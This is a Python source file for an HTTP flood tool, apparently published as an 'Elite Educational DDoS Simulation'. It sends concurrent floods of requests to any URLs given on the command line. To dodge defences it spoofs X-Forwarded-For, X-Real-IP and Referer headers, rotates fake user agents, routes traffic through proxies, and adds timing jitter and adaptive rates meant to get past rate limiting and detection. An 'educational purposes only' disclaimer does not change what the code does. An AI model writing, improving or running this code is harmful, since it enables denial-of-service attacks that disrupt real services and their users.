import asyncio
import aiohttp
import time
import random
import argparse
import json
import logging
import threading
import ssl
import matplotlib.pyplot as plt
from faker import Faker
from dataclasses import dataclass
from typing import Dict, List, Optional, Tuple
from tqdm import tqdm
from concurrent.futures import ThreadPoolExecutor
from aiohttp import ClientSession
import numpy as np
import matplotlib.animation as animation
from urllib.parse import urlparse

# Setup logging
logging.basicConfig(
    filename="ddos_attack_elite.log",
    level=logging.INFO,
    format="%(asctime)s - %(levelname)s - %(message)s"
)

fake = Faker()

# Common Referrers for Spoofing
REFERRERS = [
    "https://www.google.com/", "https://www.bing.com/", "https://search.yahoo.com/",
    "https://duckduckgo.com/", "https://www.baidu.com/", "https://yandex.com/",
    "https://www.reddit.com/", "https://twitter.com/", "https://www.facebook.com/"
]

# Attack Profile Definition
@dataclass
class AttackProfile:
    name: str
    methods: list
    headers: dict
    payload_generator: callable
    delay_variance: float
    bandwidth_limit: int
    packet_size_range: Tuple[int, int]
    spoof_referrer: bool = True

    def generate_request(self, request_id: int, urls: List[str], proxies: list = None) -> dict:
        method = random.choice(self.methods)
        headers = {k: v() if callable(v) else v for k, v in self.headers.items()}
        headers["X-Forwarded-For"] = fake.ipv4()  # Simulate IP spoofing
        headers["X-Real-IP"] = fake.ipv4()       # Additional spoofing
        if self.spoof_referrer:
            headers["Referer"] = random.choice(REFERRERS) + urlparse(random.choice(urls)).path
        headers["Accept-Language"] = random.choice(["en-US", "en-GB", "fr-FR", "de-DE", "zh-CN"])
        headers["Cache-Control"] = random.choice(["no-cache", "max-age=0"])
        headers["Connection"] = "keep-alive"  # Persistent sessions
        
        payload_size = random.randint(self.packet_size_range[0], self.packet_size_range[1])
        payload = self.payload_generator(payload_size)
        proxy = random.choice(proxies) if proxies else None
        return {
            "id": request_id,
            "method": method,
            "url": random.choice(urls),
            "headers": headers,
            "payload": payload,
            "delay_variance": self.delay_variance,
            "proxy": proxy,
            "bandwidth_limit": self.bandwidth_limit
        }

# Default Profiles
DEFAULT_PROFILES = [
    AttackProfile(
        name="Legit Traffic",
        methods=["GET"],
        headers={"User-Agent": lambda: fake.user_agent(), "Accept": "text/html,application/xhtml+xml"},
        payload_generator=lambda size: None,
        delay_variance=0.15,
        bandwidth_limit=2048*1024,  # 2MB/s
        packet_size_range=(0, 0),
        spoof_referrer=True
    ),
    AttackProfile(
        name="API Flood",
        methods=["POST", "PUT"],
        headers={"User-Agent": lambda: fake.user_agent(), "Content-Type": "application/json"},
        payload_generator=lambda size: json.dumps({"id": random.randint(1, 10000), "data": fake.text(max_nb_chars=size)}),
        delay_variance=0.03,
        bandwidth_limit=1024*1024,  # 1MB/s
        packet_size_range=(1024, 4096),
        spoof_referrer=False
    ),
    AttackProfile(
        name="Data Storm",
        methods=["POST"],
        headers={"User-Agent": lambda: fake.user_agent(), "Content-Length": lambda: str(random.randint(4096, 16384))},
        payload_generator=lambda size: fake.text(max_nb_chars=size),
        delay_variance=0.01,
        bandwidth_limit=512*1024,   # 512KB/s
        packet_size_range=(4096, 16384),
        spoof_referrer=True
    )
]

# Metrics Class
class Metrics:
    def __init__(self):
        self.success = 0
        self.failure = 0
        self.response_times = []
        self.retries = 0
        self.lock = asyncio.Lock()
        self.start_time = time.time()
        self.history = []

    async def record(self, success: bool, response_time: float, retry: bool = False):
        async with self.lock:
            if success:
                self.success += 1
            else:
                self.failure += 1
            self.response_times.append(response_time)
            if retry:
                self.retries += 1
            self.history.append((time.time() - self.start_time, response_time))

    def summary(self) -> Dict:
        total = self.success + self.failure
        avg_time = sum(self.response_times) / len(self.response_times) if self.response_times else 0
        elapsed = time.time() - self.start_time
        req_per_sec = total / elapsed if elapsed > 0 else 0
        return {
            "total": total,
            "success": self.success,
            "failure": self.failure,
            "retries": self.retries,
            "success_rate": (self.success / total) * 100 if total > 0 else 0,
            "avg_response_time": avg_time,
            "min_response_time": min(self.response_times or [0]),
            "max_response_time": max(self.response_times or [0]),
            "requests_per_second": req_per_sec
        }

    def real_time_stats(self):
        summary = self.summary()
        return (f"Real-Time: Success: {summary['success']} | Fail: {summary['failure']} | "
                f"Retries: {summary['retries']} | Avg Time: {summary['avg_response_time']:.3f}s | "
                f"Req/s: {summary['requests_per_second']:.2f}")

# Live Graphing
def live_plot(metrics: Metrics):
    fig, ax = plt.subplots(figsize=(14, 8))
    ax.set_title("Live Elite DDoS Attack Response Times")
    ax.set_xlabel("Time Since Start (s)")
    ax.set_ylabel("Response Time (s)")
    ax.grid(True, alpha=0.3)
    line, = ax.plot([], [], 'r-', label="Response Time")
    ax.legend()

    def update(frame):
        times, rts = zip(*metrics.history) if metrics.history else ([], [])
        line.set_data(times, rts)
        ax.relim()
        ax.autoscale_view()
        return line,

    ani = animation.FuncAnimation(fig, update, interval=500, blit=True, cache_frame_data=False)
    plt.show(block=False)

# Final Plotting
def plot_metrics(metrics_summary: Dict):
    plt.figure(figsize=(14, 8))
    plt.hist(metrics_summary["response_times"], bins=50, color='purple', alpha=0.7)
    plt.title("Elite DDoS Attack Response Time Distribution")
    plt.xlabel("Time (s)")
    plt.ylabel("Frequency")
    plt.grid(True, alpha=0.3)
    plt.savefig("attack_response_times_elite.png")
    print("Final response time distribution saved as 'attack_response_times_elite.png'")
    plt.close()

# Proxy Validation with Encryption Check
async def validate_proxy(proxy: str, timeout: float = 5) -> bool:
    try:
        async with aiohttp.ClientSession() as session:
            await session.get("https://example.com", proxy=proxy, timeout=aiohttp.ClientTimeout(total=timeout),
                            ssl=ssl.create_default_context())
        return True
    except Exception:
        return False

# Dynamic Rate Adjustment with Evasion
def adjust_rate(current_rate: float, metrics: Metrics) -> float:
    summary = metrics.summary()
    success_rate = summary["success_rate"]
    if success_rate > 85:
        return max(current_rate * 0.85, 0.005)  # Increase intensity subtly
    elif success_rate < 40:
        return min(current_rate * 1.2, 0.5)     # Slow down to evade detection
    return current_rate * random.uniform(0.95, 1.05)  # Random jitter

# Async Request Sender with Advanced Evasion
async def send_request(session: ClientSession, req: Dict, metrics: Metrics, rate_limit: float, progress: tqdm, max_retries: int = 5):
    attempt = 0
    while attempt < max_retries:
        try:
            start_time = time.time()
            proxy = req.get("proxy")
            payload_size = len(req["payload"].encode('utf-8')) if req["payload"] else 0
            delay = payload_size / req["bandwidth_limit"] if req["bandwidth_limit"] > 0 else 0
            
            # Randomize timing to evade rate limiting
            await asyncio.sleep(random.uniform(0, delay * 0.2))
            
            async with session.request(
                method=req["method"],
                url=req["url"],
                headers=req["headers"],
                data=req["payload"],
                timeout=aiohttp.ClientTimeout(total=10),
                proxy=proxy,
                ssl=ssl.create_default_context()  # Encrypted communication
            ) as response:
                elapsed_time = time.time() - start_time
                success = response.status in (200, 201, 204)
                await metrics.record(success, elapsed_time)
                logging.info(f"Request {req['id']}: {req['method']} - {req['url']} - Status {response.status} - Time {elapsed_time:.3f}s")
                break
        except Exception as e:
            elapsed_time = time.time() - start_time
            attempt += 1
            await metrics.record(False, elapsed_time, retry=(attempt < max_retries))
            logging.error(f"Request {req['id']}: {req['method']} - Attempt {attempt}/{max_retries} - Error: {e}")
            if attempt == max_retries:
                logging.error(f"Request {req['id']} failed after {max_retries} retries")
            await asyncio.sleep(random.uniform(0.2, 1.0) * attempt)  # Exponential backoff with jitter
    progress.update(1)
    await asyncio.sleep(rate_limit + random.uniform(0, req["delay_variance"]))
    print(f"\r{metrics.real_time_stats()}", end="")

# Main Attack Function
async def run_attack(urls: List[str], request_count: int, concurrency: int, initial_rate_limit: float, profiles: List[AttackProfile], proxies: Optional[List[str]] = None):
    metrics = Metrics()
    requests_list = [
        profile.generate_request(i, urls, proxies)
        for i in range(1, request_count + 1)
        for profile in random.choices(profiles, k=1)
    ]
    
    print(f"\nStarting Elite DDoS Simulation on {', '.join(urls)} by It Is Unique Official")
    print(f"Requests: {request_count}, Concurrency: {concurrency}, Initial Rate Limit: {initial_rate_limit}s")
    
    rate_limit = initial_rate_limit
    with tqdm(total=request_count, desc="Attack Progress", unit="req", position=0) as progress:
        async with aiohttp.ClientSession(
            headers={"User-Agent": fake.user_agent()},  # Session-wide spoofing
            cookie_jar=aiohttp.CookieJar(unsafe=True)   # Persistent cookies
        ) as session:
            tasks = []
            for i, req in enumerate(requests_list):
                tasks.append(send_request(session, req, metrics, rate_limit, progress))
                if i % (concurrency // 5) == 0:  # Adjust more frequently
                    rate_limit = adjust_rate(rate_limit, metrics)
            await asyncio.gather(*tasks[:concurrency])
            await asyncio.gather(*tasks[concurrency:])
    
    return metrics

# Proxy Validation in Parallel
def validate_proxies(proxies: List[str]) -> List[str]:
    if not proxies:
        return []
    valid_proxies = []
    with ThreadPoolExecutor() as executor:
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        futures = [loop.run_until_complete(validate_proxy(proxy)) for proxy in proxies]
        results = futures
    for proxy, is_valid in zip(proxies, results):
        if is_valid:
            valid_proxies.append(proxy)
        else:
            logging.warning(f"Proxy {proxy} failed validation and will be skipped")
    return valid_proxies

# Execute Attack
def execute_attack(urls: List[str], request_count: int, concurrency: int, rate_limit: float, profiles: List[AttackProfile], proxies: Optional[List[str]] = None):
    start_time = time.time()
    valid_proxies = validate_proxies(proxies or [])
    if proxies and not valid_proxies:
        print("Warning: No valid proxies found. Proceeding without proxies.")
    
    # Start live plotting
    metrics = Metrics()
    plot_thread = threading.Thread(target=live_plot, args=(metrics,))
    plot_thread.daemon = True
    plot_thread.start()
    
    metrics = asyncio.run(run_attack(urls, request_count, concurrency, rate_limit, profiles, valid_proxies))
    total_time = time.time() - start_time
    
    summary = metrics.summary()
    print("\n\n=== Elite DDoS Simulation Summary ===")
    print("Developed by It Is Unique Official")
    for key, value in summary.items():
        print(f"{key.replace('_', ' ').title()}: {value:.2f}" if isinstance(value, float) else f"{key.replace('_', ' ').title()}: {value}")
    print(f"Total Time Taken: {total_time:.2f}s")
    
    plot_metrics(summary)
    logging.info(f"Attack completed in {total_time:.2f}s")

# CLI Setup
def main():
    parser = argparse.ArgumentParser(description="Network-DDoS: Elite Educational DDoS Simulation Tool by It Is Unique Official")
    parser.add_argument("--url", action="append", required=True, help="Target URL(s) to simulate attack on (can be specified multiple times)")
    parser.add_argument("--requests", type=int, default=500, help="Number of requests to send")
    parser.add_argument("--concurrency", type=int, default=50, help="Number of concurrent connections")
    parser.add_argument("--rate-limit", type=float, default=0.05, help="Initial delay between requests (seconds)")
    parser.add_argument("--proxies", nargs="*", help="List of proxy URLs (e.g., http://proxy:port)")
    parser.add_argument("--custom-profile", help="JSON string for custom attack profile (e.g., '{\"name\": \"Test\", \"methods\": [\"GET\"], \"headers\": {\"User-Agent\": \"test\"}, \"payload\": \"test data\", \"delay_variance\": 0.1, \"bandwidth_limit\": 1024000, \"packet_size_range\": [512, 2048]}')")
    
    args = parser.parse_args()
    
    print("\nWARNING: This tool is for EDUCATIONAL PURPOSES ONLY. Use it only on servers you own or have permission to test.")
    print("Unauthorized use is illegal and unethical. Ensure compliance with applicable laws.\n")
    
    profiles = DEFAULT_PROFILES.copy()
    if args.custom_profile:
        try:
            custom_data = json.loads(args.custom_profile)
            custom_profile = AttackProfile(
                name=custom_data.get("name", "Custom"),
                methods=custom_data.get("methods", ["GET"]),
                headers=custom_data.get("headers", {"User-Agent": lambda: fake.user_agent()}),
                payload_generator=lambda size: custom_data.get("payload", fake.text(max_nb_chars=size)),
                delay_variance=custom_data.get("delay_variance", 0.1),
                bandwidth_limit=custom_data.get("bandwidth_limit", 1024*1024),
                packet_size_range=tuple(custom_data.get("packet_size_range", [512, 2048])),
                spoof_referrer=custom_data.get("spoof_referrer", True)
            )
            profiles.append(custom_profile)
            print(f"Added custom profile: {custom_data['name']}")
        except json.JSONDecodeError as e:
            print(f"Error parsing custom profile JSON: {e}")
            return
    
    execute_attack(args.url, args.requests, args.concurrency, args.rate_limit, profiles, args.proxies)

if __name__ == "__main__":
    main()
